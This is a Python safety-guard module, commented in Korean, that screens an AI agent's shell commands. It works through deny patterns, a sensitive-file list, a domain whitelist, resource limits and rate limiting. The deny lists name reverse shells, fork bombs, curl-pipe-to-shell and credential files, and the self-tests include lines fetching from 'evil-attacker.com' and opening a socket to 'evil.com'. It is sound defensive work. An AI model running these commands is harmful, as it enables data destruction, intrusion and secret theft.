# -*- coding: utf-8 -*-
# ------------------------------------------------------------------------
# 📄 파일명: scripts/safety_guard.py
# 📑 설명: Bounded Autonomy 및 위험 명령 탐지 엔진.
#          에이전트가 실행하려는 명령어를 사전에 검사하여 시스템 파괴,
#          권한 남용, 민감 데이터 유출 시도를 차단합니다.
#          PreToolUse 훅에서 호출됩니다.
#
#          [Task 16 강화 내용]
#          - YOLO 모드 감지: config.json에서 현재 실행 모드 읽기.
#            YOLO 모드(완전 자율 실행)에서는 더 엄격한 리소스/네트워크 제한 적용.
#          - 프로세스 단위 리소스 모니터링: 에이전트 자신(현재 Python 프로세스)
#            및 자식 프로세스의 누적 CPU/메모리 사용량을 측정하여
#            에이전트 단위 리소스 쿼터를 초과하면 명령을 차단.
#          - 강화된 네트워크 보호: 허용 도메인 화이트리스트 확장(anthropic.com,
#            npmjs.com, pypi.org 등), YOLO 모드에서 외부 통신 전면 차단 옵션.
#          - 명령 실행 빈도 제한(Rate Limiting): 타임스탬프 기반 파일 캐시를
#            이용하여 지나치게 빠른 반복 명령(예: 무한 루프) 탐지.
#
# 🕒 변경 이력 (History):
# [2026-03-06] Claude: 최초 생성 — MetaSwarm/ccswarm 패턴 참고
# [2026-03-10] Gemini: Task 16 강화 - 시스템 파괴, 권한 변경, 민감 파일 접근 패턴 대폭 확장
# [2026-03-10] Claude: Task 16 완성 - YOLO 모드 감지, 프로세스 단위 리소스 제한,
#              강화된 네트워크 화이트리스트, Rate Limiting 추가
# ------------------------------------------------------------------------
import re
import os
import json
import time
import tempfile

# 🔴 위험 명령 패턴 목록 (즉시 차단) ---------------------------------------
DANGER_PATTERNS: list[tuple[str, str]] = [
    # 1. 파일시스템 파괴 및 강제 삭제
    (r"rm\s+-[rf]+\s+/",        "루트 디렉토리 전체 삭제 시도"), 
    (r"rm\s+-[rf]+\s+\*",       "와일드카드(*)를 이용한 전체 삭제 시도"),
    (r"rm\s+-rf",               "강제 재귀 삭제 (rm -rf)"),   
    (r"del\s+/[fsq]",           "Windows 강제/하위 디렉토리 삭제 (del /s)"),
    (r"format\s+[a-zA-Z]:",     "디스크 포맷 시도"),
    (r"rd\s+/s\s+/q",           "Windows 디렉토리 강제 삭제"),
    
    # 2. 권한 및 시스템 설정 변경
    (r"chmod\s+-[R]\s+777",     "전체 읽기/쓰기/실행 권한 부여 (777)"),
    (r"chown\s+-[R]",           "소유권 강제 변경 시도"),
    (r"passwd\s+",              "비밀번호 변경 시도"),
    (r"sudo\s+",                "관리자 권한(sudo) 실행 시도"),
    (r"setenforce\s+0",         "SELinux 보안 비활성화"),
    (r"reg\s+(add|delete|copy|restore)", "Windows 레지스트리 조작"),
    (r"net\s+user",             "사용자 계정 관리"),
    
    # 3. 프로세스 및 네트워크 공격성 도구
    (r"kill\s+-[9]",            "프로세스 강제 종료 (SIGKILL)"),
    (r"pkill\s+",               "프로세스 이름 기반 일괄 종료"),
    (r"nmap\s+",                "네트워크 스캐닝 시도"),
    (r"netstat\s+-[anp]",       "네트워크 연결 상세 정보 노출"),
    (r"nc\s+-e",                "Netcat 리버스 쉘 시도"),
    (r"iptables\s+-[FD]",       "방화벽 규칙 초기화"),
    
    # 4. Git 파괴적 명령
    (r"git\s+push\s+.*--force", "Git 강제 푸시 (--force)"), 
    (r"git\s+push\s+-f\b",      "Git 강제 푸시 (-f)"),      
    (r"git\s+reset\s+--hard",   "Git 하드 리셋 (커밋 유실 위험)"),
    (r"git\s+clean\s+-[fd]",    "Git 미추적 파일 강제 삭제"),
    
    # 5. 위험한 스크립팅 및 우회
    (r"\|\s*sh\b",              "파이프를 통한 쉘 실행 (curl ... | sh)"),
    (r"\|\s*bash\b",            "파이프를 통한 Bash 실행"),
    (r"powershell\s+.*-ExecutionPolicy\s+Bypass", "PowerShell 실행 정책 우회"),
    (r":\(\)\{.*\};:",          "Fork Bomb (시스템 마비 시도)"),
]

# 🟡 경고 패턴 목록 (차단하지 않고 경고만 표시) --------------------------
WARN_PATTERNS: list[tuple[str, str]] = [
    (r"git\s+push\s+origin\s+main", "main 브랜치 직접 푸시"),
    (r"pip\s+install\s+--upgrade",  "패키지 업그레이드 (호환성 주의)"),
    (r"npm\s+install\s+-[g]",       "글로벌 패키지 설치 (환경 오염 주의)"),
    (r"find\s+/\s+-name",           "루트부터 전체 파일 검색 (리소스 과부하 가능성)"),
    (r"grep\s+-r\s+/",              "루트부터 전체 텍스트 검색 (리소스 과부하 가능성)"),
]

# ── YOLO 모드 설정 ──────────────────────────────────────────────────────
# config.json 경로: .ai_monitor/data/config.json
_CONFIG_PATH = os.path.join(
    os.path.dirname(os.path.abspath(__file__)),
    "..", ".ai_monitor", "data", "config.json"
)

# YOLO 모드 전용 프로세스 리소스 제한 (자율 실행 시 더 엄격하게)
# 일반 모드는 전체 시스템 기준으로만 체크하지만,
# YOLO 모드는 에이전트 자신의 프로세스 메모리까지 별도 제한
_RESOURCE_LIMITS = {
    "normal": {
        "system_cpu_pct":  95.0,   # 시스템 전체 CPU 경고 임계치 (%)
        "system_mem_pct":  95.0,   # 시스템 전체 메모리 경고 임계치 (%)
        "process_mem_mb": 1500,    # 에이전트 프로세스 허용 메모리 (MB)
    },
    "yolo": {
        "system_cpu_pct":  88.0,   # YOLO: 더 낮은 임계치 (사람이 없으므로 보수적)
        "system_mem_pct":  88.0,
        "process_mem_mb":  700,    # YOLO: 프로세스 메모리 제한 더 엄격
    },
}

# Rate Limiting: 1초 내 동일 명령이 N회 이상 반복되면 차단
# (YOLO 무한 루프 탐지용)
_RATE_LIMIT_FILE = os.path.join(tempfile.gettempdir(), "vibe_safety_rate.json")
_RATE_WINDOW_SEC = 3.0   # 빈도 측정 창 (초)
_RATE_MAX_CALLS  = 15    # 창 내 최대 허용 호출 수


def get_current_mode() -> str:
    """config.json에서 현재 에이전트 실행 모드를 읽습니다.

    반환값: 'yolo' 또는 'normal' (읽기 실패 시 기본값 'normal')
    YOLO 모드에서는 사람의 개입 없이 명령이 자동 실행되므로
    더 엄격한 리소스·네트워크 제한을 적용해야 합니다.
    """
    try:
        with open(_CONFIG_PATH, "r", encoding="utf-8") as f:
            cfg = json.load(f)
        return cfg.get("mode", "normal").lower()
    except Exception:
        return "normal"


def check_rate_limit() -> tuple[bool, str]:
    """명령 실행 빈도를 확인하여 비정상적으로 빠른 반복 실행을 탐지합니다.

    임시 파일에 최근 호출 타임스탬프 목록을 유지하고,
    _RATE_WINDOW_SEC 내 _RATE_MAX_CALLS 초과 시 차단합니다.
    주로 YOLO 모드에서 무한 루프로 인한 폭발적 명령 실행을 막기 위한 것입니다.
    """
    try:
        now = time.time()
        # 기존 타임스탬프 파일 로드
        try:
            with open(_RATE_LIMIT_FILE, "r") as f:
                history: list[float] = json.load(f)
        except Exception:
            history = []

        # 창(window) 내의 기록만 유지
        history = [t for t in history if now - t < _RATE_WINDOW_SEC]
        history.append(now)

        # 타임스탬프 저장
        with open(_RATE_LIMIT_FILE, "w") as f:
            json.dump(history, f)

        if len(history) > _RATE_MAX_CALLS:
            return False, (
                f"명령 실행 빈도 초과: {len(history)}회/{_RATE_WINDOW_SEC}초 "
                f"(최대 {_RATE_MAX_CALLS}회) — 무한 루프 의심"
            )
    except Exception:
        pass  # Rate limit 오류는 실행 차단하지 않음 (보수적 원칙)
    return True, ""


# 📂 민감 파일 접근 차단 패턴 (Regex) --------------------------------------
SENSITIVE_FILES = [
    r"\.env$",               # 환경 변수 (API 키 등)
    r"\.ssh/",               # SSH 키 디렉토리
    r"id_rsa",               # 개인키
    r"config/secrets",       # 비밀 설정 파일
    r"\.git/config$",        # Git 원격 주소 (토큰 포함 가능성)
    r"/etc/passwd",          # 시스템 사용자 정보
    r"/etc/shadow",          # 시스템 비밀번호 해시
]

def check_resources() -> tuple[bool, str]:
    """시스템 전체 및 에이전트 프로세스 단위 리소스를 모니터링합니다.

    [Task 16 강화]
    1. 시스템 전체 CPU/메모리를 모드별 임계치로 검사.
    2. 현재 파이썬 프로세스(에이전트) + 자식 프로세스의 메모리 합산을
       모드별 쿼터(YOLO: 700MB, 일반: 1500MB)와 비교하여
       에이전트 단위 리소스 폭증을 조기 탐지합니다.
    """
    try:
        import psutil
        mode   = get_current_mode()
        limits = _RESOURCE_LIMITS.get(mode, _RESOURCE_LIMITS["normal"])

        # ── 시스템 전체 검사 ──────────────────────────────────────────
        cpu_usage = psutil.cpu_percent(interval=0.05)
        mem_usage = psutil.virtual_memory().percent

        if cpu_usage > limits["system_cpu_pct"]:
            return False, (
                f"시스템 CPU 임계치 초과 ({cpu_usage:.1f}% > {limits['system_cpu_pct']}%) "
                f"[모드: {mode}]"
            )
        if mem_usage > limits["system_mem_pct"]:
            return False, (
                f"시스템 메모리 임계치 초과 ({mem_usage:.1f}% > {limits['system_mem_pct']}%) "
                f"[모드: {mode}]"
            )

        # ── 에이전트 프로세스 단위 검사 ──────────────────────────────
        try:
            proc = psutil.Process()
            # 현재 프로세스 메모리
            total_mem_mb = proc.memory_info().rss / (1024 * 1024)
            # 자식 프로세스(서브프로세스) 메모리 합산
            for child in proc.children(recursive=True):
                try:
                    total_mem_mb += child.memory_info().rss / (1024 * 1024)
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass  # 이미 종료된 자식 프로세스는 건너뜀

            mem_limit = limits["process_mem_mb"]
            if total_mem_mb > mem_limit:
                return False, (
                    f"에이전트 프로세스 메모리 쿼터 초과 "
                    f"({total_mem_mb:.0f}MB > {mem_limit}MB) [모드: {mode}]"
                )
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass  # 프로세스 정보를 읽을 수 없는 경우 건너뜀

    except ImportError:
        pass  # psutil 미설치 시 무시 (CI 환경 등)
    return True, ""


def check_network(command: str) -> tuple[bool, str]:
    """허용되지 않은 외부 네트워크 통신 시도를 차단합니다.

    [Task 16 강화]
    - 허용 도메인 화이트리스트 확장: anthropic.com, npmjs.com, pypi.org,
      registry.npmjs.org, files.pythonhosted.org 추가.
    - YOLO 모드: 외부 HTTP/HTTPS 통신을 전면 차단하여
      자율 실행 중 의도치 않은 데이터 유출을 방지.
    - python -c 소켓 직접 생성 패턴도 탐지.
    """
    mode = get_current_mode()
    cmd_lower = command.strip().lower()

    # YOLO 모드: curl/wget 전면 차단 (허용 도메인도 불허)
    # 이유: 사람의 감독 없이 외부로 데이터를 전송하는 행위 자체가 위험
    if mode == "yolo":
        yolo_net_patterns = [
            (r"\bcurl\b",   "YOLO 모드: curl 외부 통신 전면 차단"),
            (r"\bwget\b",   "YOLO 모드: wget 외부 통신 전면 차단"),
            (r"requests\.(get|post|put|delete|patch)\s*\(.*http[s]?://(?!localhost|127)",
             "YOLO 모드: requests 외부 HTTP 호출 차단"),
        ]
        for pattern, reason in yolo_net_patterns:
            if re.search(pattern, cmd_lower):
                return False, reason

    # 일반 모드: 허용 도메인 화이트리스트 기반 차단
    allowed_hosts = (
        r"(localhost"
        r"|127\.0\.0\.1"
        r"|github\.com"
        r"|api\.openai\.com"
        r"|google\.com"
        r"|anthropic\.com"
        r"|api\.anthropic\.com"
        r"|registry\.npmjs\.org"
        r"|npmjs\.com"
        r"|pypi\.org"
        r"|files\.pythonhosted\.org"
        r"|raw\.githubusercontent\.com"
        r")"
    )
    net_patterns = [
        (
            rf"curl\s+.*http[s]?://(?!.*{allowed_hosts})",
            "허용되지 않은 외부 호스트로의 HTTP 요청 (curl)"
        ),
        (
            rf"wget\s+.*http[s]?://(?!.*{allowed_hosts})",
            "허용되지 않은 외부 호스트로의 파일 다운로드 (wget)"
        ),
        (
            r"python\s+.*-c\s+.*socket\s*\.\s*connect",
            "Python 직접 소켓 연결 시도 탐지"
        ),
    ]
    for pattern, reason in net_patterns:
        if re.search(pattern, cmd_lower):
            return False, reason
    return True, ""

def check_file_access(command: str) -> tuple[bool, str]:
    """명령어 내에 민감한 파일 경로가 포함되어 있는지 확인합니다."""
    cmd_lower = command.strip().lower()
    for pattern in SENSITIVE_FILES:
        if re.search(pattern, cmd_lower):
            return False, f"민감 파일 접근 시도 탐지: {pattern}"
    return True, ""

def check(command: str) -> tuple[bool, str]:
    """명령어의 안전성을 종합적으로 검사합니다.

    검사 순서 (빠른 것 먼저):
      1. Rate Limiting — 비정상적 반복 실행 탐지
      2. 시스템/프로세스 리소스 — CPU/메모리 임계치
      3. 민감 파일 접근 — .env, SSH 키 등
      4. 네트워크 통신 — 허용 도메인 외 차단 (YOLO 모드: 전면 차단)
      5. 위험 명령 패턴 — rm -rf, git reset --hard 등

    Returns:
        (safe: bool, reason: str) — safe=True 이면 통과, False 이면 차단 사유 반환
    """
    if not command or not command.strip():
        return True, ""

    # 1. Rate Limiting (YOLO 모드 무한 루프 탐지)
    rate_safe, rate_reason = check_rate_limit()
    if not rate_safe:
        return False, rate_reason

    # 2. 시스템 전체 + 에이전트 프로세스 단위 리소스 체크
    res_safe, res_reason = check_resources()
    if not res_safe:
        return False, res_reason

    # 3. 민감 파일 접근 체크
    file_safe, file_reason = check_file_access(command)
    if not file_safe:
        return False, file_reason

    # 4. 네트워크 통신 체크 (YOLO: 전면 차단, 일반: 화이트리스트)
    net_safe, net_reason = check_network(command)
    if not net_safe:
        return False, net_reason

    # 5. 위험 명령 패턴 매칭 (Regex)
    for pattern, reason in DANGER_PATTERNS:
        if re.search(pattern, command.strip(), re.IGNORECASE):
            return False, reason

    return True, ""

def warn(command: str) -> str | None:
    """명령어에 대한 경고 메시지를 반환합니다 (차단하지 않음)."""
    if not command or not command.strip():
        return None

    for pattern, reason in WARN_PATTERNS:
        if re.search(pattern, command.strip(), re.IGNORECASE): 
            return reason

    return None

if __name__ == "__main__":
    # ── Task 16 통합 테스트 ─────────────────────────────────────────────
    print("=== safety_guard.py Task 16 통합 테스트 ===")
    print(f"  현재 모드: {get_current_mode()}\n")

    test_cases = [
        # (명령어, 예상_safe, 설명)
        ("rm -rf .git",                           False, "Git 디렉토리 삭제"),
        ("cat .env",                              False, "환경변수 파일 접근"),
        ("curl http://evil-attacker.com/shell.sh",False, "허용되지 않은 외부 curl"),
        ("curl https://api.anthropic.com/v1/messages", True, "허용 도메인 curl"),
        ("wget https://registry.npmjs.org/pkg",   True,  "허용 도메인 wget"),
        ("chmod -R 777 /var/www",                 False, "전체 권한 부여"),
        ("git push origin main",                  True,  "main 푸시 (WARN이지만 차단 아님)"),
        ("git push --force origin main",          False, "강제 푸시"),
        ("python scripts/memory.py list",         True,  "일반 스크립트 실행"),
        ("ls -la",                                True,  "안전한 목록 조회"),
        ("python -c \"import socket; socket.connect(('evil.com', 80))\"",
                                                  False, "직접 소켓 연결 시도"),
        (":(){:|:&};:",                           False, "Fork Bomb"),
    ]

    all_pass = True
    for cmd, expected_safe, desc in test_cases:
        safe, reason = check(cmd)
        status = "PASS" if safe == expected_safe else "FAIL"
        if status == "FAIL":
            all_pass = False
        flag = "SAFE ✓" if safe else f"BLOCKED: {reason}"
        print(f"  [{status}] {desc}")
        print(f"         cmd: '{cmd[:60]}'")
        print(f"         → {flag}\n")

    # 경고 테스트
    print("--- 경고 패턴 테스트 ---")
    for cmd, _, desc in test_cases:
        w = warn(cmd)
        if w:
            print(f"  ⚠️  {desc}: {w}")

    print(f"\n결과: {'✅ 모든 테스트 통과' if all_pass else '❌ 일부 테스트 실패'}")
